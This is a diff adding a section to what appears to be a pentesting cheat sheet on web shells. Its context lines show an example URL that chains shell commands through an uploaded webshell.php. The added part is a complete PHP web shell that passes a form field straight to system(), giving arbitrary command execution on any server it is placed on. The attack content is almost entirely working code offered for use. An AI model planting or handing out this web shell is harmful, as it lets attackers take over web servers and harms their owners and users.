@@ -47,3 +47,23 @@ http://test.com/uploaded-files/webshell.php?cmd=id;whoami;ls
 
 This also uses the fact that ; at a shell prompt makes it possible to run several commands after each other
 
+#### A pretty one
+
+```php
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="text" name="command" autofocus id="command" size="50">
+<input type="submit" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['command'])) 
+    {
+        system($_GET['command'] . ' 2>&1'); 
+    }
+?>
+</pre>
+</body>
+</html>
+```
